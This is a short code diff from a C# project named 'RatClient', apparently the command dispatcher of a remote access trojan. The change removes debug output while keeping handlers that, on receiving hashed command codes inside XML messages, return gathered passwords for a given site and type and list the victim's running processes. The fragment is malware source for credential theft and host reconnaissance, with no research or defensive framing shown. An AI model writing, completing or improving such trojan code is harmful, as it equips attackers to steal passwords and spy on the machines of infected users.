@@ -26,15 +26,11 @@ namespace RatClient
             }
             else if(command == "5df297c2f2da83a8b45cfd012fbf9b3c")
             {
-                System.Console.WriteLine("Match");
                 string type = xmlDoc.SelectSingleNode("/root/type").InnerText;
                 string web = xmlDoc.SelectSingleNode("/root/web").InnerText;
-                System.Console.WriteLine($"{web} {type}");
-                byte[] test =  Passwords.Gather(web, type);
-                Console.WriteLine(test.Length);
-                return test;
+                return Passwords.Gather(web, type);
             }
-            else if(command== "be425fd08e9ea24230bac47493228ada")
+            else if(command == "be425fd08e9ea24230bac47493228ada")
             {
                 return ProcInfo.GetFormatedProcesses();
             }
